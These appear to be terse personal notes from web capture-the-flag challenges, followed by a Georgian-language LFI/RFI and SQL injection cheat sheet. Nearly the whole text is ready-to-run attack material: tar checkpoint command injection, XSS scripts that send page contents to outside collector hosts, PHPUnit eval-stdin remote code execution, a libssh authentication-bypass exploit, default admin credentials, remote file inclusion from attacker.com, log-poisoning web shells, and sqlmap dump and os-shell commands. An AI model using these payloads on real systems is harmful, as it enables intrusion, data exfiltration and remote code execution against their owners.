# RED


1.tartarsausage  -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="ls"        dirsearch -u http://35.246.139.54:31660/enhjenhzZGN3YWRzYWRhc2Rhc3NhY2FzY2FzY2FzY2FjYWNzZHNhY2FzY2Fzc2FjY2Fz/ -e php,txt,html


2.Frameble     <script> fetch('https://eoxmt8wpvlva3h2.m.pipedream.net?data='+document.body.innerText); </script>      AN          <script>fetch('https://enxe7m9zrqkto.x.pipedream.net?data='+document.body.innerText);</script>


-3.rundown     curl -X OPTIONS http://35.246.139.54:30595 -i         http://35.246.139.54:30595/console             curl -X POST http://35.246.139.54:30595 -d "cmd=cat /flag.txt" (ase vipovit rom pickle a)

-4. online-encryption


5 manual-review <script> fetch('https://eoxmt8wpvlva3h2.m.pipedream.net?data='+document.body.innerText); </script>


-6 bolt    http://34.159.151.77:31474/bolt/login admin:password

7 alfa-cookies- https://drive.google.com/file/d/1YjUzKJJnrR0L5DNr3H8GSDFRz73d6ekM/view

8 nondiff-backdoor   grep -r "shell.exec"    34.159.62.179:30876/?welldone=knockknock&shazam=cat flag.php    CTF{87702788126237df9c4a915fea9441345dc6b3a0272b214b2c31e50a8f89c4b1}

9 schematick sqlmap -u http://34.159.62.179:32027/index.php  --cookie="PHPSESSID=e40e1c0f2baba9b6b6d07033355f0819" --forms --columns


10 elastic python exploit.py http://35.198.97.185:31763/ /etc/passwd
11 libshh  https://github.com/nikhil1232/LibSSH-Authentication-Bypass  python3 LibAuth.py --host 34.40.24.84 -p 30908 -c "cat /flag.txt"

12 authorization  dirsearch -u IP                     curl -X POST http://34.159.62.179:30798/auth             (aplikacia) ModHeader: Authorization        JWT   <TOKEM>

13 PHPunit  http://35.246.139.54:31380/composer.json    curl -X POST --data '<?php system("id"); ?>' http://35.246.139.54:31380/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php


curl -X POST --data '<?php system("cat /flag.txt"); ?>' http://35.246.139.54:31380/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php

14


https://jorgectf.github.io/blog/post/cyberedu-web-challenges/#rundown 
(alien-inclusion
address
broken-login
manual-review
rundown
slightly-broken
ping-station
downloader-v1
puzzled)





































საბაზისო LFI:

http://example.com/?page=../../../../etc/passwd
http://example.com/?file=file:///etc/passwd
PHP Wrapper-ები:

http://example.com/?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/?page=data://text/plain,<?php system("id"); ?>
RFI (Remote File Inclusion):

http://example.com/?page=http://attacker.com/shell.txt
Log Poisoning (Apache/Nginx):

curl "http://example.com" -H "User-Agent: <?php system($_GET['cmd']); ?>"
http://example.com/?page=/var/log/apache2/access.log&cmd=id


sqlmap -u "http://example.com/?id=1" --dbs
sqlmap -u "http://example.com/?id=1" -D database_name --tables
sqlmap -u "http://example.com/?id=1" -D database_name -T users --dump
sqlmap -u "http://example.com/?id=1" --os-shell
